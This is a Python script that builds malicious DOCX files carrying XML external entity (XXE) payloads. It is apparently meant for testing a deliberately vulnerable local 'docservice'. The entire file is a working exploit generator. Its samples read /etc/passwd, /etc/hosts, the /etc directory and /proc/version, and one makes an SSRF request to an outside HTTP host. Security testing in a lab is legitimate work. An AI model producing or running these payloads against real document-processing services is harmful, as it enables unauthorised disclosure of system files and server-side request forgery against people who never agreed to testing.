#!/usr/bin/env python3
"""
XXE Attack Demo Script
Creates a malicious DOCX file containing XXE payloads for testing the vulnerable docservice
"""

import zipfile
import os
import tempfile
import argparse

def create_malicious_docx(output_file, xxe_payload="file:///etc/passwd"):
    """
    Create a malicious DOCX file with XXE payload
    """
    
    # Basic DOCX structure with XXE payload
    document_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "{xxe_payload}">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>This document contains XXE payload: &xxe;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>If you can see file contents above, XXE attack succeeded!</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>'''

    app_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <ScaleCrop>false</ScaleCrop>
  <SharedDoc>false</SharedDoc>
  <HyperlinksChanged>false</HyperlinksChanged>
  <AppVersion>16.0000</AppVersion>
</Properties>'''

    core_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:title>XXE Demo Document</dc:title>
  <dc:creator>Security Tester</dc:creator>
  <dc:description>This document demonstrates XXE vulnerabilities</dc:description>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-01-01T12:00:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-01-01T12:00:00Z</dcterms:modified>
</cp:coreProperties>'''

    content_types_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
  <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
</Types>'''

    rels_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/>
</Relationships>'''

    word_rels_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>'''

    # Create DOCX file
    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as docx:
        docx.writestr('[Content_Types].xml', content_types_xml)
        docx.writestr('_rels/.rels', rels_xml)
        docx.writestr('word/document.xml', document_xml)
        docx.writestr('word/_rels/document.xml.rels', word_rels_xml)
        docx.writestr('docProps/core.xml', core_xml)
        docx.writestr('docProps/app.xml', app_xml)

    print(f"✅ Created malicious DOCX: {output_file}")
    print(f"📄 XXE Payload: {xxe_payload}")
    return output_file


def create_multiple_xxe_samples():
    """Create multiple XXE attack samples for testing"""
    
    samples = [
        {
            "name": "xxe_file_read.docx",
            "payload": "file:///etc/passwd",
            "description": "Read /etc/passwd file"
        },
        {
            "name": "xxe_file_read_hosts.docx", 
            "payload": "file:///etc/hosts",
            "description": "Read /etc/hosts file"
        },
        {
            "name": "xxe_directory_listing.docx",
            "payload": "file:///etc/",
            "description": "Directory listing attempt"
        },
        {
            "name": "xxe_proc_version.docx",
            "payload": "file:///proc/version",
            "description": "Read system version info"
        },
        {
            "name": "xxe_http_request.docx",
            "payload": "http://httpbin.org/get",
            "description": "External HTTP request (SSRF)"
        }
    ]
    
    os.makedirs("xxe_samples", exist_ok=True)
    
    for sample in samples:
        filepath = os.path.join("xxe_samples", sample["name"])
        create_malicious_docx(filepath, sample["payload"])
        print(f"   Description: {sample['description']}")
        print()
    
    print(f"📁 All samples created in ./xxe_samples/ directory")
    print("🚀 Upload these files to the docservice to test XXE vulnerabilities!")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create malicious DOCX files for XXE testing")
    parser.add_argument("--output", "-o", default="malicious.docx", help="Output DOCX filename")
    parser.add_argument("--payload", "-p", default="file:///etc/passwd", help="XXE payload (file path or URL)")
    parser.add_argument("--samples", "-s", action="store_true", help="Create multiple XXE sample files")
    
    args = parser.parse_args()
    
    if args.samples:
        create_multiple_xxe_samples()
    else:
        create_malicious_docx(args.output, args.payload)
        print(f"\n🧪 Test this file by uploading to: http://docservice.localhost")
        print("⚠️  Make sure the vulnerable docservice is running!")
